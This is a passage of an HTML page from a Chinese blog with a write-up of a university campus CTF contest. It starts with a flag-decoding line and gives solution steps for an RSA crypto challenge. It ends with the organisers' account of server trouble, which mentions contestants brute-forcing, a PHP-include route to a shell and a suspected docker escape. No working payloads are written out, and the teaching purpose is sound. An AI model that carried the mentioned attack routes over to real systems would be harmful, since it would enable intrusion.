chr(int(str(encode_str[i:i+<span class="number">3</span>]),<span class="number">8</span>)),</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<p><strong>Crypto30 </strong><br>师弟出的题<br>考点主要在脑洞 能否找齐rsa所需参数<br>可继续增加难度 加入注入 将一个参数放入数据库<br>查看源码发现hint<br><img src="wp.png" alt="wp"><br>猜测这是道RSA题目<br>但是缺少e n<br>在源码中发现了这个link</p>
+<p><img src="wp1.png" alt="wp"><br>猜测这是道RSA题目<br>但是缺少e n<br>在源码中发现了这个link<br><img src="wp2.png" alt="wp"><br>得到e=3<br>下载该图片 查看属性发现n<br><img src="wp3.png" alt="wp"><br>这里有坑点 虽然指数很低但是不能使用低指数攻击<br>接着常规解rsa即可得到flag<br><img src="wp4.png" alt="wp"><br>接着16进制转字符串即可</p>
+<h2 id="花絮"><a href="#花絮" class="headerlink" title="花絮"></a>花絮</h2><p>校内赛题目和平台筹建的时间比较匆忙，题目质量上算作入门还是可以的，期间的运维和维护还好没有出现很大的问题，都是使用docker进行构建的，主要出现的一个文件就是web100的apache日志文件能达到158G很是让我费解。<br><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""><br>导致平台的mysql死掉<br>磁盘占满之后查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">none            181G  172G     0 100% /var/lib/docker/aufs/mnt/561abf9658d7ac2c51e41b63112cfea5b22394ab2b6558108b9bb84b749d1def</span><br><span class="line">none            181G  172G     0 100% /var/lib/docker/aufs/mnt/0711d7896aff73e514d624aa920a9bb0be1a70837f7371ecb58b5cdc338ff6d0</span><br><span class="line">none            181G  172G     0 100% /var/lib/docker/aufs/mnt/576fc7e57bbeff551954e7c4a2ba098dedbc88e08923affbec0b4eb258c4a4f5</span><br><span class="line">none            181G  172G     0 100% /var/lib/docker/aufs/mnt/2d154c4b3b136505f6c47d4d14ccb87d508d43b5585d134a7dd06ff945ac8dba</span><br><span class="line">会导致</span><br><span class="line"> * Stopping MySQL database server mysqld                                                                                                                      [ OK ] </span><br><span class="line"> * /etc/init.d/mysql: ERROR: The partition with /var/lib/mysql is too full!</span><br><span class="line"> 启动不了</span><br></pre></td></tr></table></figure></p>
+<p>最后只能删除日志文件重启物理机。<br>很简单的一个php包含拿shell的思路，结果一些大佬直接就爆破，无限制的爆破，我就很蒙蔽。<br>运维也算是一个力气活，感觉比赛必须还是做成数据可视化的会比较好，下次应该会配置的完善一些加上elk、docker定时回滚。<br>另一方面感觉应该是被提权把docker日穿了，后面把日志down下来再做分析吧。:)ORZ多谢各位师傅手下留情，没有DDOS。说实话我们就一台服务器。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持作者</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/09/18/新疆首届攻防比赛wp/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-新疆师范大学第二届校内CTF比赛WP" 
+      data-title="新疆师范大学第二届校内CTF比赛WP" data-url="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"forsigner"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+    
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: document.location.href, 
+    sourceId: "",
+    productKey: "d16a7241e7cd4b389584ed8db2a4e8bc",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+
+
+    
+
+	<hr />
+	<div id="hypercomments_widget"></div>
+	<script type="text/javascript">
+	_hcwp = window._hcwp || [];
+
+	_hcwp.push({widget:"Stream", widget_id: '89821'});
+
+	(function() {
+
+	if("HC_LOAD_INIT" in window) return;
+
+	HC_LOAD_INIT = true;
+
+	var lang = (navigator.language || navigator.systemLanguage || navigator.userLanguage || "en").substr(0, 2).toLowerCase();
+
+	var hcc = document.createElement("script"); 
+	hcc.type = "text/javascript"; 
+	hcc.async = true;
+	hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://w.hypercomments.com/widget/hc/"+'89821' +"/"+lang+"/widget.js";
+
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hcc, s.nextSibling);
+	})();
+
+	</script>
+
+	<a href="http://hypercomments.com" class="hc-link" title="comments widget">Powered by HyperComments</a>
+
+
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
